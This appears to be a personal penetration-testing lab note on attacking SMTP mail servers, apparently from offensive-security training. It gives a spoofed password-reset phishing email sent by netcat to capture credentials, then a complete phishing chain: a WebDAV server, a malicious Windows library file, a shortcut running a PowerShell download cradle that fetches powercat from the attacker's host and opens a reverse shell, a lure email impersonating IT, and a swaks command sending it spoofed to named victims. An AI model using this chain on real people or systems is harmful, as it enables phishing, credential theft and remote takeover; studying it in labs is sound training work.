Also see [[143, 110 imap and pop3]]

#### Catch Sensitive Information
This may help catch cleartext credentials.
Example -- [[Postfish]]
SMTP method
	Start listener
		`nc -lvnp 80`
	connect to smtp
		`nc -v <domain> 25
```
helo test
	250 postfish.off
MAIL FROM: it@postfish.off
	250 2.1.0 Ok
RCPT TO: brian.moore@postfish.off
	250 2.1.5 Ok
DATA
	354 End data with <CR><LF>.<CR><LF>
Subject: Password Reset

Hi Brian,

Please follow this link to reset your password: http://192.168.45.219/

Regards,
 
.
	250 2.0.0 Ok: queued as 6CE4B4543F
QUIT
```

#### Phishing with swaks -- reverse shell

Host WebDAV server
```
mkdir /home/kali/<any_dir_name>/webdav

wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/<any_dir_name>/webdav/
```
we can verify this work by creating test.txt file and inserting into webdav dir, and visiting `127.0.0.1/<test_file>` in browser

Create malicious MS library file
	Connect to WINPREP via RDP as offsec:lab
	Open VSCode
	Create new text file on desktop named config.Library-ms
	use this code, modify IP accdess to ours
```
<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
<name>@windows.storage.dll,-34582</name>
<version>6</version>
<isLibraryPinned>true</isLibraryPinned>
<iconReference>imageres.dll,-1003</iconReference>
<templateInfo>
<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
</templateInfo>
<searchConnectorDescriptionList>
<searchConnectorDescription>
<isDefaultSaveLocation>true</isDefaultSaveLocation>
<isSupported>false</isSupported>
<simpleLocation>
<url>http://<our_ip_address></url>
</simpleLocation>
</searchConnectorDescription>
</searchConnectorDescriptionList>
</libraryDescription>
```
-
	save and transfer (NOT A SHORTCUT) to `/home/kali/<any_directory>/webdav

Create shortcut file on WINPREP
	right click > new > shortcut
```
powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<our_ip>:8000/powercat.ps1'); powercat -c <our_ip> -p 4444 -e powershell"
```
name: `install`
	transfer to kali into WebDAV directory

Copy powercat to any directory
	`cp /usr/share/powershell-empire/empire/server/data/module_source/management/powercat.ps1 /path/to/<directory>

Start python3 server to host powercat file
	`cd /path/to/directory`
	`python3 -m http.server 8000


Start nc listener over 4444
	`nc -lvnp 4444`

Send email with swaks
	Create body.txt file in `/home/kali/<any_directory>` `# just do webdav...`
```
Hey!

Please install the new security features on your workstation. For this, download the attached file, double-click on it, and execute the configuration shortcut within. Thanks!

IT
```


Send to victim user(s) (ie: daniela, marcus) spoofed as`<admin_user>`
```
sudo swaks -t <target1>@<domain.com> -t <target2>@<domain.com> --from <mail_server_user>@<domain.com> --attach @config.Library-ms --server <target_ip> --body @body.txt --header "Subject: Staging Script" --suppress-data -ap

Username: <mail_server_user>@<domain.com>
Password: <password>
```
then just wait


Receive reverse shell


